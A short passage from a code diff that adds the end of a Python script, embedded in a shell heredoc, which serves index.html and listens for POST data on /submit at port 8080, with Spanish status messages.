+            self.path = '/index.html'
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
+print("🚀 Servidor Python iniciado en el puerto 8080")
+print("📡 Esperando datos POST en /submit...\n")
+
+with socketserver.TCPServer(("0.0.0.0", PORT), DataHandler) as httpd:
+    httpd.serve_forever()
+PYTHON_SCRIPT
